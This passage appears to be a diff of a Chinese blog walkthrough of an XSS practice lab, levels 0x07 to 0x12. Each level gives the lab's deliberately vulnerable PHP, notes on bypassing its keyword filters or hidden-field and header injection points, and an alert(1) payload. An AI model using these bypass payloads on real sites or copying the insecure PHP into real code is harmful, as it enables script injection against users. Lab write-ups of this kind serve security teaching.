strtolower($_GET[&quot;keyword&quot;]);<br>$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);<br>$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);<br>$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);<br>$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);<br>$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);<br>$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);<br>echo &#x27;&lt;center&gt;<br>&lt;form action=level8.php method=GET&gt;<br>&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;<br>&lt;input type=submit name=submit value=添加友情链接 /&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;&#x27;;<br>?&gt;<br>&lt;?php<br> echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;<br>?&gt;<br></code></pre></td></tr></table></figure>
+<h2 id="0X07-老铁要和我换友链嘛？"><a href="#0X07-老铁要和我换友链嘛？" class="headerlink" title="0X07 老铁要和我换友链嘛？"></a>0X07 老铁要和我换友链嘛？</h2><div class="code-wrapper"><pre><code class="hljs php+HTML">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);
+echo &#x27;&lt;center&gt;
+&lt;form action=level8.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&#x27;;
+?&gt;
+&lt;?php
+ echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;
+?&gt;</code></pre></div>
 
 <p>本题对$str进行了小写限制和过滤,但是经过过滤后的$str7使用在 a标签的href属性上面,href属性可以使用JavaScript协议来执行JS代码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">payload:<br>JavaScrip<span class="hljs-symbol">&amp;#x74;</span>:alert(1)<br><br>因为&quot;script&quot;会被过滤替换成&quot;scr_ipt&quot;,所以将字母进行编码HTML实体,HTML实体在浏览器解析时会进行解码还原字符<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs html">payload:
+JavaScrip<span class="hljs-symbol">&amp;#x74;</span>:alert(1)
+
+因为&quot;script&quot;会被过滤替换成&quot;scr_ipt&quot;,所以将字母进行编码HTML实体,HTML实体在浏览器解析时会进行解码还原字符</code></pre></div>
 
 <br>
 <br>
 
 
-<h2 id="0x08-添加友连again"><a href="#0x08-添加友连again" class="headerlink" title="0x08 添加友连again"></a>0x08 添加友连again</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>ini_set(&quot;display_errors&quot;, 0);<br>$str = strtolower($_GET[&quot;keyword&quot;]);<br>$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);<br>$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);<br>$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);<br>$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);<br>$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);<br>$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);<br>echo &#x27;&lt;center&gt;<br>&lt;form action=level9.php method=GET&gt;<br>&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;<br>&lt;input type=submit name=submit value=添加友情链接 /&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;&#x27;;<br>?&gt;<br>&lt;?php<br>if(false===strpos($str7,&#x27;http://&#x27;))<br>&#123;<br>  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;<br>        &#125;<br>else<br>&#123;<br>  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
+<h2 id="0x08-添加友连again"><a href="#0x08-添加友连again" class="headerlink" title="0x08 添加友连again"></a>0x08 添加友连again</h2><div class="code-wrapper"><pre><code class="hljs php+HTML">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);
+echo &#x27;&lt;center&gt;
+&lt;form action=level9.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&#x27;;
+?&gt;
+&lt;?php
+if(false===strpos($str7,&#x27;http://&#x27;))
+&#123;
+  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;
+        &#125;
+else
+&#123;
+  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;
+&#125;
+?&gt;</code></pre></div>
 
 <p>本题与第八题基本相似,但是加入了一个限制,传入的值必须包含”http://“,但是没有限制出现的位置,所以只要传入的值包含就行</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">payload:<br>JavaScrip<span class="hljs-symbol">&amp;#x74;</span>:alert(1) // http://<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs html">payload:
+JavaScrip<span class="hljs-symbol">&amp;#x74;</span>:alert(1) // http://</code></pre></div>
 
 <br>
 <br>
 
-<h2 id="0x09-嗯-搜索又出现了"><a href="#0x09-嗯-搜索又出现了" class="headerlink" title="0x09 嗯 搜索又出现了"></a>0x09 嗯 搜索又出现了</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="0x09-嗯-搜索又出现了"><a href="#0x09-嗯-搜索又出现了" class="headerlink" title="0x09 嗯 搜索又出现了"></a>0x09 嗯 搜索又出现了</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
+<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];
+<span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];
+<span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);
+<span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span>
+<span class="hljs-string">&lt;form id=search&gt;</span>
+<span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span>
+<span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span>
+<span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span>
+<span class="hljs-string">&lt;/form&gt;</span>
+<span class="hljs-string">&lt;/center&gt;&#x27;</span>;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>本题没有文本框,看代码发现是被设置隐藏了,所以需要将属性进行重写覆盖,对于$str11进行了’&lt;’ , ‘&gt;’过滤,因此使用JS DOM代码事件进行弹窗</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">payload:<br>t_sort=<span class="hljs-string">&quot; type=text onclick=javascript:alert(1) //</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs javascript">payload:
+t_sort=<span class="hljs-string">&quot; type=text onclick=javascript:alert(1) //</span></code></pre></div>
 
 <br>
 <br>
 
-<h2 id="0x10-为什么这么多搜索呢"><a href="#0x10-为什么这么多搜索呢" class="headerlink" title="0x10 为什么这么多搜索呢"></a>0x10 为什么这么多搜索呢</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br><span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="0x10-为什么这么多搜索呢"><a href="#0x10-为什么这么多搜索呢" class="headerlink" title="0x10 为什么这么多搜索呢"></a>0x10 为什么这么多搜索呢</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
+<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];
+<span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];
+<span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];
+<span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);
+<span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span>
+<span class="hljs-string">&lt;form id=search&gt;</span>
+<span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span>
+<span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span>
+<span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span>
+<span class="hljs-string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span>
+<span class="hljs-string">&lt;/form&gt;</span>
+<span class="hljs-string">&lt;/center&gt;&#x27;</span>;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>本题依旧没有文本框 , 但是查看代码是发现 , $str11传值的地方不在URL , 而是在请求头的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%8F%83%E7%85%A7%E4%BD%8D%E5%9D%80">REFERER</a>里面,需要伪造REFERER进行攻击</p>
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-referer.png" srcset="/Study/img/loading.gif" lazyload></p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">payload<br>t_sort=<span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=javascript:alert(1) //</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs js">payload
+t_sort=<span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=javascript:alert(1) //</span></code></pre></div>
 
 <br>
 <br>
 
-<h2 id="0x11-黑人问号"><a href="#0x11-黑人问号" class="headerlink" title="0x11 黑人问号"></a>0x11 黑人问号</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<br><span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="0x11-黑人问号"><a href="#0x11-黑人问号" class="headerlink" title="0x11 黑人问号"></a>0x11 黑人问号</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
+<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];
+<span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];
+<span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];
+<span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);
+<span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span>
+<span class="hljs-string">&lt;form id=search&gt;</span>
+<span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span>
+<span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span>
+<span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span>
+<span class="hljs-string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span>
+<span class="hljs-string">&lt;/form&gt;</span>
+<span class="hljs-string">&lt;/center&gt;&#x27;</span>;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>本题与第十一题 相似 , 不过本题$str11的传值的地方在请求头的UA里面 , 依旧需要伪造攻击,payload依旧是第十一题的payload</p>
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-user-agent.png" srcset="/Study/img/loading.gif" lazyload></p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">payload<br>t_sort=<span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=javascript:alert(1) //</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs js">payload
+t_sort=<span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=javascript:alert(1) //</span></code></pre></div>
 
 <br>
 <br>
 
-<h2 id="0x12-做题好爽啊"><a href="#0x12-做题好爽啊" class="headerlink" title="0x12 做题好爽啊"></a>0x12 做题好爽啊</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>setcookie(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;call me maybe?&quot;</span>, time()+<span class="hljs-number">3600</span>);<br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;user&quot;</span>];<br><span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="0x12-做题好爽啊"><a href="#0x12-做题好爽啊" class="headerlink" title="0x12 做题好爽啊"></a>0x12 做题好爽啊</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+setcookie(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;call me maybe?&quot;</span>, time()+<span class="hljs-number">3600</span>);
+ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
+<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];
+<span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];
+<span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;user&quot;</span>];
+<span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);
+<span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span>
+<span class="hljs-string">&lt;form id=search&gt;</span>
